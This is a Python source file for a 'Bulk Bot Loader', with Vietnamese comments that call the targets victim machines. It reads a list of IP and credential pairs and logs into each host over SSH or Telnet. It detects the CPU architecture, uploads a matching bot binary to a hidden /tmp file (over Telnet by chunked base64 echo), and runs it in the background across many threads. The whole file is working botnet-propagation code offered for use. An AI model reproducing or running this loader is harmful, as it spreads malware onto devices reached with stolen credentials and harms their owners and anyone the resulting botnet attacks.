import argparse
import base64
import logging
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

logger = logging.getLogger(__name__)


class Loader:
    def __init__(self, timeout: int = 30, binary_dir: str = "dist/"):
        self.timeout = timeout
        self.binary_dir = Path(binary_dir)
        self.results: list[dict] = []

    def load_targets(self, targets_file: str) -> list[dict]:
        """Parse file ip:port:user:pass"""
        targets = []
        with open(targets_file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) >= 4:
                    targets.append({
                        "ip": parts[0],
                        "port": int(parts[1]),
                        "user": parts[2],
                        "pass": ":".join(parts[3:]),  # password có thể chứa dấu :
                    })
        logger.info("Loaded %d targets from %s", len(targets), targets_file)
        return targets

    def deploy(self, target: dict, binary_path: str | None = None) -> dict:
        """Triển khai binary lên một máy nạn nhân."""
        ip = target["ip"]
        port = target["port"]
        user = target["user"]
        result = {"ip": ip, "port": port, "user": user, "success": False, "os": "", "arch": "", "error": ""}

        try:
            # Detect port type: 22=SSH, 23=Telnet, other=SSH default
            if port == 23:
                result.update(self._deploy_telnet(target, binary_path))
            else:
                result.update(self._deploy_ssh(target, binary_path))
        except Exception as e:
            result["error"] = str(e)
            logger.error("Deploy failed for %s@%s:%d — %s", user, ip, port, e)

        return result

    def _deploy_ssh(self, target: dict, binary_path: str | None) -> dict:
        import paramiko

        ip, port, user, password = target["ip"], target["port"], target["user"], target["pass"]
        result = {"success": False, "os": "", "arch": "", "error": ""}

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(ip, port=port, username=user, password=password, timeout=self.timeout, allow_agent=False, look_for_keys=False)

            # Detect arch
            arch = self._detect_arch_ssh(ssh)
            result["arch"] = arch
            result["os"] = self._detect_os_ssh(ssh)

            # Chọn binary phù hợp
            bin_path = binary_path or self._select_binary(arch)
            if bin_path is None:
                result["error"] = f"No binary for arch: {arch}"
                return result

            bin_name = Path(bin_path).name

            # SCP upload
            sftp = ssh.open_sftp()
            remote_path = f"/tmp/.{bin_name}"
            sftp.put(bin_path, remote_path)
            sftp.chmod(remote_path, 0o755)
            sftp.close()

            # Execute
            stdin, stdout, stderr = ssh.exec_command(f"{remote_path} &", timeout=5)
            time.sleep(1)

            result["success"] = True
            logger.info("Deployed to %s@%s:%d (%s/%s)", user, ip, port, result["os"], arch)

        except Exception as e:
            result["error"] = str(e)
        finally:
            ssh.close()

        return result

    def _deploy_telnet(self, target: dict, binary_path: str | None) -> dict:
        import telnetlib

        ip, port, user, password = target["ip"], target["port"], target["user"], target["pass"]
        result = {"success": False, "os": "", "arch": "", "error": ""}

        try:
            tn = telnetlib.Telnet(ip, port, timeout=self.timeout)
            tn.read_until(b"login: ", timeout=10)
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(password.encode() + b"\n")

            time.sleep(1)
            # Detect arch
            tn.write(b"uname -m\n")
            arch_output = tn.read_until(b"\n", timeout=5).decode().strip()
            if "aarch64" in arch_output:
                result["arch"] = "aarch64"
            elif "arm" in arch_output:
                result["arch"] = "arm"
            elif "x86_64" in arch_output:
                result["arch"] = "x86_64"
            elif "mips" in arch_output:
                result["arch"] = "mips" if "mipsel" not in arch_output else "mipsel"
            else:
                result["arch"] = "x86"

            # Chọn binary
            bin_path = binary_path or self._select_binary(result["arch"])
            if bin_path is None:
                result["error"] = f"No binary for arch: {result['arch']}"
                return result

            # Upload qua base64 (không có SCP với Telnet)
            with open(bin_path, "rb") as f:
                data = base64.b64encode(f.read()).decode()

            bin_name = Path(bin_path).name
            remote_path = f"/tmp/.{bin_name}"

            # Chunked base64 upload
            chunk_size = 512
            tn.write(f"echo -n '' > {remote_path}.b64\n".encode())
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i + chunk_size]
                tn.write(f"echo -n '{chunk}' >> {remote_path}.b64\n".encode())
                time.sleep(0.05)

            tn.write(f"base64 -d {remote_path}.b64 > {remote_path}\n".encode())
            tn.write(f"chmod +x {remote_path}\n".encode())
            time.sleep(1)
            tn.write(f"{remote_path} &\n".encode())
            time.sleep(0.5)

            result["success"] = True
            logger.info("Deployed (telnet) to %s@%s:%d (%s)", user, ip, port, result["arch"])

        except Exception as e:
            result["error"] = str(e)
        finally:
            try:
                tn.close()
            except Exception:
                pass

        return result

    def _detect_arch_ssh(self, ssh) -> str:
        stdin, stdout, stderr = ssh.exec_command("uname -m", timeout=5)
        uname = stdout.read().decode().strip().lower()
        return uname

    def _detect_os_ssh(self, ssh) -> str:
        stdin, stdout, stderr = ssh.exec_command("uname -s", timeout=5)
        os_name = stdout.read().decode().strip()
        stdin, stdout, stderr = ssh.exec_command("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'", timeout=5)
        version = stdout.read().decode().strip()
        if version:
            return version
        stdin, stdout, stderr = ssh.exec_command("uname -r", timeout=5)
        return f"{os_name} {stdout.read().decode().strip()}"

    def _select_binary(self, arch: str) -> str | None:
        """Map arch string → binary file path."""
        arch_map = {
            "aarch64": "client.aarch64",
            "armv7l": "client.arm",
            "arm": "client.arm",
            "x86_64": "client.x86_64",
            "amd64": "client.x86_64",
            "i386": "client.x86",
            "i686": "client.x86",
            "x86": "client.x86",
            "mips": "client.mips",
            "mipsel": "client.mipsel",
        }
        filename = arch_map.get(arch)
        if filename is None:
            return None
        path = self.binary_dir / filename
        return str(path) if path.exists() else None


def main():
    parser = argparse.ArgumentParser(description="Bulk Bot Loader")
    parser.add_argument("--targets", "-t", required=True, help="File targets (ip:port:user:pass)")
    parser.add_argument("--binary", "-b", help="Path tới binary bot cụ thể")
    parser.add_argument("--binary-dir", "-d", default="dist/", help="Thư mục chứa binary bot")
    parser.add_argument("--threads", "-n", type=int, default=10, help="Số thread đồng thời")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout kết nối (giây)")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%H:%M:%S",
    )

    loader = Loader(timeout=args.timeout, binary_dir=args.binary_dir)
    targets = loader.load_targets(args.targets)

    if not targets:
        logger.error("No targets found in %s", args.targets)
        sys.exit(1)

    success = 0
    failed = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(loader.deploy, t, args.binary): t for t in targets}
        for future in as_completed(futures):
            result = future.result()
            if result["success"]:
                success += 1
            else:
                failed += 1
            status = "✓" if result["success"] else "✗"
            print(f"  [{status}] {result['user']}@{result['ip']}:{result['port']}  {result.get('os','')} {result.get('arch','')}  {result.get('error','')}")

    print(f"\nDone: {success} success, {failed} failed, {len(targets)} total")


if __name__ == "__main__":
    main()
